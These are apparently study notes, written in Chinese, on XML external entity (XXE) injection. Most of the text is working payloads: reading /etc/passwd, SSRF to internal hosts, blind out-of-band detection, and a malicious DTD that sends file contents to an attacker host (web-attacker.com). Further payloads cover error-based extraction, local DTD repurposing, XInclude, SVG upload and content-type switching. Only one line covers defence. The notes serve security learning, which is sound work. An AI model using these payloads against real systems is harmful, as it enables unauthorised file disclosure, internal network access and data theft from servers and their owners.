# XML external entity (XXE) injection
* XML 外部實體注入(XXE)，是指攻擊者干擾應用程式對 XML 數據的處理，進一步存取系統或相關的外部系統資料。
## 成因
* 有些網站透過 XML 格式來作為 browser 與 server 間的傳輸格式，而開發者使用公用的 XML 解析器，但未關閉預設的危險功能，導致出現 XXE 漏洞。
## 案例
### Exploiting XXE to retrieve files
* 定義了一個包含文件內容的外部實體，並在應用程式回應中返回。
* 像是原本應用程式透過 XML 來傳遞查詢庫存。
```
<?xml version="1.0" encoding="UTF-8"?>
<stockCheck><productId>381</productId></stockCheck>
```
* 我們在中間插入一個外部實體。
* 定義一個 DOCTYPE 元素，該元素定義包含文件路徑的外部實體。
* 編輯應用程式回應中返回的 XML 中的數據值，以使用定義的外部實體。
```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<stockCheck><productId>&xxe;</productId></stockCheck>
```
### Exploiting XXE to perform SSRF attacks
* 定義引入後端系統的 URL 之外部實體，來進一步達成 SSRF。
```
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://internal.vulnerable-website.com/"> ]>
```
### Blind XXE vulnerabilities
#### Detecting blind XXE using out-of-band (OAST) techniques
* 使用像 SSRF 的方式，不過加入 OAST 技巧，來偵測 blind XXE。
```
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://f2g9j7hhkax.web-attacker.com"> ]>
```
#### Bypassing via XML parameter entities
* 有時因為應用程式會進行驗證，使我們定義的實體無法使用，因此我們可以改用  XML parameter entities 來繞過。
* 使用 `%` 宣告參數，並可以在 DTD 中直接使用其參數。
```
<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://f2g9j7hhkax.web-attacker.com"> %xxe; ]>
```
#### Exploiting blind XXE to exfiltrate data out-of-band
* 透過 OAST 載入惡意 dtd 來取得資料。
* 首先定義取得檔案的 `malicious.dtd`。
    * 定義 file 參數，定義引入外部檔案資料。
    * 然後定義 eval 參數，定義將取得的資料傳送到我們設定的服務器上。
    * 執行 eval 參數，建立出 eval 實體，然後取得 file 資料。
    * 執行 exfiltrate，將資料傳送的我們這邊。
    * 備註 : `&#x25;` 是 `%` 編碼。
```
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://web-attacker.com/?x=%file;'>">
%eval;
%exfiltrate;
```
* 之後透過請求我們的服務器載入我們定義的 `malicious.dtd` 檔案，執行取得資料。
```
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM
"http://web-attacker.com/malicious.dtd"> %xxe;]>
```
#### Exploiting blind XXE to retrieve data via error messages
* 透過錯誤訊息，來顯示資料。
* 這邊透過 `file:///nonexistent/%file;` 找不到檔案而觸發錯誤訊息，進一步顯示 `%file` 參數所附帶的資料。
```
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
```
#### Exploiting blind XXE by repurposing a local DTD
* 有時我們是透過引入外部 DTD 來達成攻擊，但有時候可能 XML 本身已經宣告包含 `DOCTYPE` 的內部 DTD，因此有可能無法再引入外部 DTD 。(不過還是要看解析器，有些可以接受，有些則不行。)
* 因此我們可以透過重新定義 DTD 中的實體，來達成攻擊。
* 像是這邊重新定義 `file:///usr/local/app/schema.dtd` 中的`custom_entity` ，然後透過觸發找不到檔案的錯誤，來顯示資料。
```
<!DOCTYPE foo [
<!ENTITY % local_dtd SYSTEM "file:///usr/local/app/schema.dtd">
<!ENTITY % custom_entity '
<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
&#x25;eval;
&#x25;error;
'>
%local_dtd;
]>
```
* 有了透過重新定義本地 DTD 的實體技巧後，我們可以直接測試系統中是否有預設存在的 DTD 檔案，再將其引入透過重新定義實體達成攻擊，
* Linux 上如果使用 GNOME 桌面環境，則會存在 `/usr/share/yelp/dtd/docbookx.dtd`
```
<!DOCTYPE foo [
<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
%local_dtd;
]>
```
### Finding hidden attack surface for XXE injection
#### XInclude attacks
* 有些應用程式，可能是在後端才嵌入 xml 來處理資歷 (像是 SOAP 協定)，因此我們無法在前端去改寫 `DOCTYPE`，不過我們可以透過 `XInclude` 來使後端處理時來建立XML。
```
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
<xi:include parse="text" href="file:///etc/passwd"/></foo>
```
#### XXE attacks via file upload
* 有些檔案格式可能是透過 XML 的格式來表達，因此我們也可以透過檔案上傳的方式來達成 XXE 攻擊。
* 包含 XML 的 SVG 圖片
```
<?xml version="1.0" standalone="yes"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]><svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1"><text font-size="16" x="0" y="16">&xxe;</text></svg>
```
#### XXE attacks via modified content type
* 有時我們可以透過修改 `Content-Type` 來傳遞 XML 給後端，來達成攻擊。
* 大部分後端都是接收 html form 表單，`Content-Type` 為`application/x-www-form-urlencoded`。
```
POST /action HTTP/1.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 7

foo=bar
```
* 不過有些應用程式，也可以接受傳遞 XML 的格式。
```
POST /action HTTP/1.0
Content-Type: text/xml
Content-Length: 52

<?xml version="1.0" encoding="UTF-8"?><foo>bar</foo>
```
## 防禦
* 了解目前所使用的 XML 解析器，關閉不必要或危險的功能。
---
###### tags: `web security`